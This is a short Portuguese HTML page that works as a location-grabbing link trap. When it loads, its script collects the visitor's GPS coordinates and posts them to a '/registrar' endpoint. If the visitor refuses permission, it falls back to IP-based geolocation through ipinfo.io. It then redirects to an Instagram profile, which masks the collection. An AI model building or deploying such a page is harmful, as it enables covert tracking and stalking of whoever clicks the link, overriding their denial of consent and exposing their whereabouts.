<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Localizando...</title>
    <script>
        function enviarLocalizacao(lat, lon, precisa) {
            fetch('/registrar', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ lat, lon, precisa })
            }).finally(() => {
                window.location.href = "https://www.instagram.com/mateusflorenzano?igsh=ZmF5a2UyNml3Nmc0";
            });
        }

        function obterLocalizacao() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        // Se o usuário permitir, usamos as coordenadas GPS
                        enviarLocalizacao(pos.coords.latitude, pos.coords.longitude, true);
                    },
                    erro => {
                        // Se o usuário não permitir, tentamos buscar via IP
                        fetch('https://ipinfo.io/json?token=SEU_TOKEN_IPINFO')  // Substitua pelo seu token real
                            .then(res => res.json())
                            .then(d => {
                                const [lat, lon] = d.loc.split(',');
                                enviarLocalizacao(parseFloat(lat), parseFloat(lon), false);
                            })
                            .catch(() => {
                                // Caso não consiga pegar a localização, enviaremos (0,0) como fallback
                                enviarLocalizacao(0.0, 0.0, false);
                            });
                    },
                    { timeout: 5000 } // Tempo de timeout para pegar a localização
                );
            } else {
                // Caso o navegador não suporte geolocalização
                enviarLocalizacao(0.0, 0.0, false);
            }
        }

        window.onload = obterLocalizacao; // Inicia a coleta da localização assim que a página carregar
    </script>
</head>
<body>
    <p>Obtendo sua localização...</p>
</body>
</html>
